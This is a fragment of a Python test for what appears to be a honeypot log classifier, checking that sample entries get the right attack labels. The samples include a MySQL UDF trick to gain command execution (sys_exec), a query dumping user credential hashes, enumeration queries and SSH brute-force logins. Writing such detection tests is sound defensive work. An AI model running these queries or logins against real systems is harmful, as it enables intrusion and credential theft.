        ("MYSQL QUERY CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'", "sql-udf-rce"),
        ("MYSQL QUERY show databases", "sql-enum"),
        ("MYSQL QUERY SELECT user,authentication_string FROM mysql.user", "sql-enum"),
        ("MYSQL QUERY select @@version", "sql-enum"),
        # a benign connect-time probe must NOT be flagged as enumeration
        ("MYSQL QUERY select @@version_comment limit 1", None),
        # --- SSH honeypot (port 22): must beat cred-attack's web-login pattern ---
        ("SSH LOGIN user=root pass=123456 client=SSH-2.0-libssh2_1.9.0", "ssh-bruteforce"),
        ("SSH LOGIN user=admin pass=admin client=SSH-2.0-Go", "ssh-bruteforce"),
        ("SSH LOGIN user=git pass=key:0a1b2c client=SSH-2.0-paramiko_3.4", "ssh-bruteforce"),
    ]
    ok = True
    for blob, want in SAMPLES:
        got = classify(blob)
        gid = got["id"] if got else None
        flag = "✓" if gid == want else "✗"
        if gid != want:
            ok = False
        print(f"{flag} {want or '(clean)':<16} got={gid or '(none)'}   {blob[:52]!r}")
    print("\nATTACK_KB:", len(ATTACK_KB), "techniques |", "PASS ✅" if ok else "FAIL ❌")
    raise SystemExit(0 if ok else 1)
